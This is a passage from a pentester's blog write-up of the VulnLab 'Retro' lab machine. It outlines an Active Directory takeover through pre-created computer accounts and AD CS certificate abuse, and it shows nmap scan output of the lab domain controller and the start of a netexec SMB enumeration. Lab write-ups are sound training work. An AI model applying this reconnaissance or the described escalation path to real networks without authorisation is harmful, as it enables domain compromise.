+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../index.html" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://avatars.githubusercontent.com/u/108031577?v=4" alt="Tom Fieber">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://tomfieber.github.io">Tom Fieber</a>
+                        
+                      </strong>
+                      <br>
+                      Dad, husband, okay pentester
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-07-04 00:00:00+00:00" class="md-ellipsis">July 4, 2024</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../category/writeups.html">writeups</a>, 
+                              <a href="../../../category/vulnlab.html">vulnlab</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              14 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">adcs</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">pre-created-computer-accounts</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="vulnlab-retro">VulnLab: Retro<a class="headerlink" href="#vulnlab-retro" title="Permanent link">&para;</a></h1>
+<p>Retro is an <strong>EASY</strong> rated machine on <a href="https://wiki.vulnlab.com/guidance/easy/retro">VulnLab</a>. This machine involves abusing a flaw with pre-created computer accounts to change a password and take over control of the account. From there, abuse an AD CS misconfiguration to obtain a certificate as a domain administrator that can be used for authentication to the domain controller. </p>
+<!-- more -->
+<p><a class="glightbox" href="../../../images/vulnlab_retro/retro.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/vulnlab_retro/retro.png" /></a></p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="go">PORT      STATE SERVICE       REASON  VERSION</span>
+<span class="go">53/tcp    open  domain        syn-ack Simple DNS Plus</span>
+<span class="go">88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-04 15:04:07Z)</span>
+<span class="go">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| ssl-cert: Subject: commonName=DC.retro.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span>
+<span class="go">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-07-04T14:45:48</span>
+<span class="go">| Not valid after:  2025-07-04T14:45:48</span>
+<span class="go">| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3</span>
+<span class="go">| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF</span>
+<span class="go">| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU</span>
+<span class="go">| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0</span>
+<span class="go">| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD</span>
+<span class="go">| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2</span>
+<span class="go">| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx</span>
+<span class="go">| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd</span>
+<span class="go">| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8</span>
+<span class="go">| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H</span>
+<span class="go">| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG</span>
+<span class="go">| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV</span>
+<span class="go">| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG</span>
+<span class="go">| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg</span>
+<span class="go">| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw</span>
+<span class="go">| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ</span>
+<span class="go">| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t</span>
+<span class="go">| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB</span>
+<span class="go">| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO</span>
+<span class="go">| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl</span>
+<span class="go">| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2</span>
+<span class="go">| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu</span>
+<span class="go">| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y</span>
+<span class="go">| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049</span>
+<span class="go">| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp</span>
+<span class="go">| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO</span>
+<span class="go">| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0</span>
+<span class="go">| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC</span>
+<span class="go">| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw</span>
+<span class="go">| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1</span>
+<span class="go">| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+</span>
+<span class="go">| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy</span>
+<span class="go">| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx</span>
+<span class="go">| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a</span>
+<span class="go">| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98</span>
+<span class="go">| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B</span>
+<span class="go">| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX</span>
+<span class="go">| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd</span>
+<span class="go">| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">445/tcp   open  microsoft-ds? syn-ack</span>
+<span class="go">464/tcp   open  kpasswd5?     syn-ack</span>
+<span class="go">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">| ssl-cert: Subject: commonName=DC.retro.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span>
+<span class="go">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-07-04T14:45:48</span>
+<span class="go">| Not valid after:  2025-07-04T14:45:48</span>
+<span class="go">| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3</span>
+<span class="go">| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF</span>
+<span class="go">| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU</span>
+<span class="go">| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0</span>
+<span class="go">| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD</span>
+<span class="go">| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2</span>
+<span class="go">| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx</span>
+<span class="go">| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd</span>
+<span class="go">| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8</span>
+<span class="go">| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H</span>
+<span class="go">| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG</span>
+<span class="go">| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV</span>
+<span class="go">| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG</span>
+<span class="go">| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg</span>
+<span class="go">| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw</span>
+<span class="go">| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ</span>
+<span class="go">| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t</span>
+<span class="go">| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB</span>
+<span class="go">| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO</span>
+<span class="go">| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl</span>
+<span class="go">| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2</span>
+<span class="go">| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu</span>
+<span class="go">| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y</span>
+<span class="go">| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049</span>
+<span class="go">| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp</span>
+<span class="go">| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO</span>
+<span class="go">| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0</span>
+<span class="go">| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC</span>
+<span class="go">| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw</span>
+<span class="go">| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1</span>
+<span class="go">| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+</span>
+<span class="go">| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy</span>
+<span class="go">| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx</span>
+<span class="go">| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a</span>
+<span class="go">| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98</span>
+<span class="go">| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B</span>
+<span class="go">| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX</span>
+<span class="go">| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd</span>
+<span class="go">| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">|_ssl-date: TLS randomness does not represent time</span>
+<span class="go">| ssl-cert: Subject: commonName=DC.retro.vl</span>
+<span class="go">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span>
+<span class="go">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-07-04T14:45:48</span>
+<span class="go">| Not valid after:  2025-07-04T14:45:48</span>
+<span class="go">| MD5:   b521:4db7:959d:8255:ce20:7ff1:8455:44f3</span>
+<span class="go">| SHA-1: 2c90:5a76:83d3:eeb6:13ac:8cce:b456:91c6:a514:baeb</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIHDjCCBPagAwIBAgITJgAAAAcYs2Ns/jHeNAAAAAAABzANBgkqhkiG9w0BAQsF</span>
+<span class="go">| ADBBMRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgVyZXRybzEU</span>
+<span class="go">| MBIGA1UEAxMLcmV0cm8tREMtQ0EwHhcNMjQwNzA0MTQ0NTQ4WhcNMjUwNzA0MTQ0</span>
+<span class="go">| NTQ4WjAWMRQwEgYDVQQDEwtEQy5yZXRyby52bDCCASIwDQYJKoZIhvcNAQEBBQAD</span>
+<span class="go">| ggEPADCCAQoCggEBAOgTELs6vjluN3mt2fyU4vpzox+gLEDS3ozNDKZVdaaLYiE2</span>
+<span class="go">| FcGOUWedlKkepT732TBkXPM2asajykmycj3QZpO2aWKXktb90xcO89zdAd9Kupxx</span>
+<span class="go">| 7mU2JHYPuccb1TktEdJIglFHb1VsElqv4bzfeN3szej/W0ShU9HQcPQpiOfUBbUd</span>
+<span class="go">| cQjQBgv2zMLeD443mmfausFNilhJeozfsFUjJlZr5Bd0KSFvsXBvTw29a0HwYuF8</span>
+<span class="go">| p2vYHmXnG6Cg/uwb2EHDEGi2zuh1AahzkMiyHn3WbxrNzqNHi6zc5AsCOYkhkt7H</span>
+<span class="go">| Suw1WRsncH3C6z+GfOYNZWPMbDz2k9ytvKIC7VECAwEAAaOCAygwggMkMC8GCSsG</span>
+<span class="go">| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV</span>
+<span class="go">| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG</span>
+<span class="go">| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg</span>
+<span class="go">| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw</span>
+<span class="go">| BwYFKw4DAgcwCgYIKoZIhvcNAwcwNwYDVR0RBDAwLqAfBgkrBgEEAYI3GQGgEgQQ</span>
+<span class="go">| yLv8MaLCl0S4TFuXub2nKoILREMucmV0cm8udmwwHQYDVR0OBBYEFEizNO44LO6t</span>
+<span class="go">| Fu7VoXyZzmA4XTuTMB8GA1UdIwQYMBaAFDg6yqfPu6RkQ20kT5QJ8b3pa05eMIHB</span>
+<span class="go">| BgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFwOi8vL0NOPXJldHJvLURDLUNBLENO</span>
+<span class="go">| PURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl</span>
+<span class="go">| cyxDTj1Db25maWd1cmF0aW9uLERDPXJldHJvLERDPXZsP2NlcnRpZmljYXRlUmV2</span>
+<span class="go">| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu</span>
+<span class="go">| dDCBugYIKwYBBQUHAQEEga0wgaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1y</span>
+<span class="go">| ZXRyby1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049</span>
+<span class="go">| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1yZXRybyxEQz12bD9jQUNlcnRp</span>
+<span class="go">| ZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBO</span>
+<span class="go">| BgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk4MzU0</span>
+<span class="go">| Nzc1NS02OTgyNjAxMzYtNDI4MzkxODE3Mi0xMDAwMA0GCSqGSIb3DQEBCwUAA4IC</span>
+<span class="go">| AQCcIarI/KSW6gMuKgTtljrGngCZ3jsZyEfThxk9CFDRV/9BOZ/Of6SjWKTbinRw</span>
+<span class="go">| TpPlb1TeY4MMDzmcxwZk3z1fD37NvKIGVBtO1CBncJVCVFwvuRysRCJWZqX3/Jh1</span>
+<span class="go">| FiZM4RrCmi8hpWXLUfWhgp43LesHxcibJL+mZLqo4uyH0fXDHDaHkkKiZGsaEPb+</span>
+<span class="go">| grVpXpLZuUj8AiUzuPZVFs293yYGBo8w+DRDKTDg9ei7OUQyAlHJ7Ek3ddUJJnWy</span>
+<span class="go">| YO81QtIFKiePSBEJs+tXd/p3f/5Y8Z4yhSf+Q3ost0cPw5e6dPVTlEcxcNpmfhjx</span>
+<span class="go">| kNN/gn9mXDlHhB3w+6/ixoFYBZP/kLK90aXv69ypI/x3MpXsbQ9XP9sFdd/LRz2a</span>
+<span class="go">| SFkz71zx0kuI9hdfDMkbePd5eLXGC7ATq2oLwfIlZ+dZAYGlihQ4JLFFccsHKb98</span>
+<span class="go">| alxJngkA/7fqeFScSyxr56XGzsaFhQ7WeoAfJci3VqCppXAygPIY9y77s6JdMb4B</span>
+<span class="go">| N++gu864u2CbdaFLpAJfzQIsQgH48EPC7phHs/Rus+Ut4vuKA8H2vCeGCGICtvLX</span>
+<span class="go">| 6Uvp6QakYNI9D7yIrL+k+JvOI4Rn1ft6H4Cs8zwqcLQKKn4AF/MjrqZw7UdyWXJd</span>
+<span class="go">| wBuJAsNeXIMHejFcJVqNHdSQQrq34kmqmkKuncOQJZMQeQ==</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span>
+<span class="go">|_ssl-date: 2024-07-04T15:04:55+00:00; -1s from scanner time.</span>
+<span class="go">| rdp-ntlm-info:</span>
+<span class="go">|   Target_Name: RETRO</span>
+<span class="go">|   NetBIOS_Domain_Name: RETRO</span>
+<span class="go">|   NetBIOS_Computer_Name: DC</span>
+<span class="go">|   DNS_Domain_Name: retro.vl</span>
+<span class="go">|   DNS_Computer_Name: DC.retro.vl</span>
+<span class="go">|   Product_Version: 10.0.20348</span>
+<span class="go">|_  System_Time: 2024-07-04T15:04:15+00:00</span>
+<span class="go">| ssl-cert: Subject: commonName=DC.retro.vl</span>
+<span class="go">| Issuer: commonName=DC.retro.vl</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-07-03T14:54:33</span>
+<span class="go">| Not valid after:  2025-01-02T14:54:33</span>
+<span class="go">| MD5:   ffe1:2ad8:4117:4568:d611:7914:ebb1:55ee</span>
+<span class="go">| SHA-1: b8d3:ebe0:0f22:16f8:3dda:1fc4:85e4:7a3f:fedc:f749</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIC2jCCAcKgAwIBAgIQFdODfzdLvL5J3XDHt1LQ2TANBgkqhkiG9w0BAQsFADAW</span>
+<span class="go">| MRQwEgYDVQQDEwtEQy5yZXRyby52bDAeFw0yNDA3MDMxNDU0MzNaFw0yNTAxMDIx</span>
+<span class="go">| NDU0MzNaMBYxFDASBgNVBAMTC0RDLnJldHJvLnZsMIIBIjANBgkqhkiG9w0BAQEF</span>
+<span class="go">| AAOCAQ8AMIIBCgKCAQEAyZHMAjboQwXUiBzlJAcCAa1bFfTKHC7O2saNi/FdCRIz</span>
+<span class="go">| 3iBLeBoCWN7YOPHjBVkNJFJTqrgZl3BX7oOSZ+QOIimJqgYu98zNUuZUf4sxC7MB</span>
+<span class="go">| 3gem6bhPKuU0Zylj0Krl9j+fLMO5uB7hNc0elTyG0xss3Q/bvlA10A7yl7+iOPp/</span>
+<span class="go">| 5yNkC/UksecJ2W9IybMNuygdaD3QPieaG3pwqfxp1NXmZQfBDuC7wKLLjBnvmvWm</span>
+<span class="go">| 9fQUa1v/Wb+eZ6xuNCshfkRg5uH5wEHFp9mppIlAp9OXpqM5jyHX9kZX3KGktchS</span>
+<span class="go">| JBl8edLWpfBgmn8fXRBjUeGvnnPIsp+GsQHhPwchPQIDAQABoyQwIjATBgNVHSUE</span>
+<span class="go">| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAB6b</span>
+<span class="go">| V8+nHs3eRQrrz9pOxuqfFwUPtqs5LXtYPErxfIjoNzgdz7PBYF3lDCpwAwX0ChyH</span>
+<span class="go">| TyZGWnQLfUDvNv3XyQ3OLlGy6MnDfVPukbn/EDgpX78cJREqv7jgIaivIRE/TnGk</span>
+<span class="go">| 9BdZEDf6gqd+rxWVdOzEq3HhcHi17QGKeQujx3+jiKlflHkuV5jH/ZlAapXYRhJ2</span>
+<span class="go">| L5YhhHNxGK54PxDL7QVs7IVt06PGOn/6i5Tgeh/w8O0f4Bqt1orob6vaZxKCjAYy</span>
+<span class="go">| ljrbSm8pBDnN6ylQxF/kh7LMpjt4ru7WkTgu3Px7lgBDL2onqBnRK24pna/gQ/DZ</span>
+<span class="go">| 1rHj6K+M9vMhQIHsQ1Y=</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">49672/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span>
+<span class="go">| p2p-conficker:</span>
+<span class="go">|   Checking for Conficker.C or higher...</span>
+<span class="go">|   Check 1 (port 30448/tcp): CLEAN (Timeout)</span>
+<span class="go">|   Check 2 (port 50684/tcp): CLEAN (Timeout)</span>
+<span class="go">|   Check 3 (port 47219/udp): CLEAN (Timeout)</span>
+<span class="go">|   Check 4 (port 49250/udp): CLEAN (Timeout)</span>
+<span class="go">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span>
+<span class="go">| smb2-time:</span>
+<span class="go">|   date: 2024-07-04T15:04:16</span>
+<span class="go">|_  start_date: N/A</span>
+<span class="go">| smb2-security-mode:</span>
+<span class="go">|   3:1:1:</span>
+<span class="go">|_    Message signing enabled and required</span>
+</code></pre></div>
+<p>We can see from the nmap scan that there are a fair number of ports open. Additionally, it is likely that this machine is a domain controller based on the presence of Kerberos (port 88), LDAP (ports 389/636), etc. </p>
+<h3 id="service-enumeration">Service Enumeration<a class="headerlink" href="#service-enumeration" title="Permanent link">&para;</a></h3>
+<h4 id="smb">SMB<a class="headerlink" href="#smb" title="Permanent link">&para;</a></h4>
+<p>We can get the general information for the SMB service using <code>netexec</code>. As shown below, the machine name is <code>DC</code> and the domain is <code>retro.vl</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  retro nxc smb $ip</span>
